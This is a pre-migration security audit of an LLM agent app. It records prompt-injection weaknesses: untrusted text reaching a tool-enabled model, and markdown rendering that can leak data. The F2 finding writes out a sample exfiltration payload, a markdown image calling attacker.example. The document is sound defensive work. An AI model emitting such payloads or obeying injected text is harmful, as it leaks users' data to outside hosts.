# AUDIT.md — M0 security audit of the existing build

**Date:** 2026-09-02 · **Auditor:** pre-migration review against the eleven invariants
**Subject:** the deployed Perimeter build prior to the dual-model airlock migration

This audit ran **before** any migration code was written. It exists as evidence that the
security process preceded the work rather than being reconstructed afterwards. Findings are
recorded with the file and line that produced them, including the ones that are unflattering.

---

## Summary

| Invariant | Status | Severity |
|---|---|---|
| INV-1 — no `UNTRUSTED` text in a tool-enabled request | **VIOLATED** | Critical |
| INV-2 — Reader request carries no tools | Partial | Medium |
| INV-3 — `uid` only from a verified token | **PASS** | — |
| INV-4 — no tool without a capability grant | **NOT IMPLEMENTED** | High |
| INV-5 — tainted egress needs fresh confirmation | **NOT IMPLEMENTED** | N/A (no egress yet) |
| INV-6 — every decision logged before execution | **PASS** | — |
| INV-7 — client never writes the audit log | **PASS** | — |
| INV-8 — secrets from Secret Manager, never leaked | Partial | Low |
| INV-9 — untrusted text never rendered as HTML | **VIOLATED** | High |
| INV-10 — generic client-facing errors | **PASS** | — |
| INV-11 — guarded outbound fetch | Partial | Medium |

Two violations, one of them critical. Both are fixed in M1–M3.

---

## Critical findings

### F1 — INV-1 violated: untrusted content reaches a tool-enabled model

`server/agent.ts:199-215` assembles `assembled.contextBlock` — which contains fenced
`UNTRUSTED` artifact text — into `contents`, and passes it to `generateWithTools`, which binds
`tools: [{ functionDeclarations: … }]` at `server/agent.ts:146`.

**Untrusted text and tool access occupy the same model call.** The existing defence is
delimiter fencing plus deterministic turn-taint bookkeeping. Taint is a genuine architectural
control and it does stop write-class tools from a tainted turn — but the *reading itself* still
happens inside a model that holds tools. An attacker who defeats the fencing is one step from a
tool call rather than zero steps.

**Fix:** M3. Split into a Reader with no `tools` key and a Planner that never sees raw
untrusted text. This is the reason the migration exists.

### F2 — INV-9 violated: model output rendered as markdown

`src/components/JournalEditor.tsx:907` renders assistant output through `ReactMarkdown`.

Model output is derived from untrusted content and can be poisoned. `ReactMarkdown` converts
`![](https://attacker.example/x.png?d=…)` into an `<img>`, and the browser fetches it. That is
an exfiltration channel requiring **no tool call at all** — the defence being built in M3–M5
would not have stopped it.

This is corpus payload P08, and it is exploitable in the currently deployed build.

**Fix:** M1, ahead of everything else. An `UntrustedText` renderer that escapes, never
linkifies, and does not load remote resources.

---

## Passing controls

**INV-3.** `grep -rn "body\.uid\|query\.uid\|params\.uid\|body\.userId" server/ src/` returns
nothing. `uid` is set only in `server/auth.ts:89` from `verifyIdToken`. Every Firestore path is
rooted at that value.

**INV-6 / INV-7.** `server/audit.ts` writes the decision before the executor runs
(`server/agent.ts`, decision recorded prior to `executeTool`). `firestore.rules` denies clients
`create`, `update` and `delete` on `audit`, and 29 emulator tests cover it — including that the
*owner* cannot forge or delete their own audit events.

**INV-10.** Handlers return typed generic messages; stack traces stay server-side. Malformed
JSON returns a clean `400` rather than Express's HTML error page.

---

## Partial controls

**INV-2 — right instinct, wrong scope.** `server/classify.ts:107` deliberately binds no tools,
with a comment explaining why. That is exactly the Reader property — but it applies only to the
L2 threat classifier, not to the model that reads content for the user. M3 generalises it.

**INV-8 — no leak, but not SDK-fetched.** The Gemini key is injected by Cloud Run from Secret
Manager via `--set-secrets` and read at `server/gemini.ts:15`. It is **not** in the image, not
in source, and never referenced by client code.

> **Correction to the M0 check as specified.** The instruction *"`grep -rE 'AIza[0-9A-Za-z_-]{20,}' dist/`
> must be empty"* is wrong as written. It matches
> `AIzaSyBj-ZtoCMStsV6uX-bCsehMvpfbm_Zq4RE`, which is the **public Firebase web API key** from
> `firebase-applet-config.json` and is *supposed* to ship in the client bundle. Verified: the key
> in `dist/assets/index-*.js` is byte-identical to the Firebase config key, and
> `grep -rn "GEMINI_API_KEY" src/` returns nothing. The CI check must target the Gemini key
> specifically, or exclude the known Firebase value, or it will train everyone to ignore it.

**INV-11 — safe but narrow.** `server/github.ts` enforces HTTPS, a single-host allowlist
(`api.github.com`), `redirect: 'error'`, and a 15s timeout. Safe because the allowlist is one
host — so no DNS or IP-range checking exists. The moment user-supplied URLs are accepted, this
is insufficient. M3 adds resolution-time private/loopback/link-local/metadata rejection.

---

## Not implemented

**INV-4.** Authorisation is a static allowlist in `server/tools.ts` plus unconditional
confirmation on write-class tools. Functional, and the write gate is real, but it is a constant
rather than a grant: nothing is scoped to a resource, nothing expires, and the user cannot
revoke. M4.

**INV-5.** No egress-class tool exists yet, so there is nothing to gate. M5.

---

## What already works and must not be lost

96 tests pass (67 unit, 29 Firestore rules against the emulator). Firebase Auth, per-user
Firestore isolation, Secret Manager, the mandated Gemini fallback ladder, multi-turn
conversation with `turns[]`, and automatic summarisation are all live and are **graded Phase 2
requirements**. The migration must not trade any of them for the new architecture.
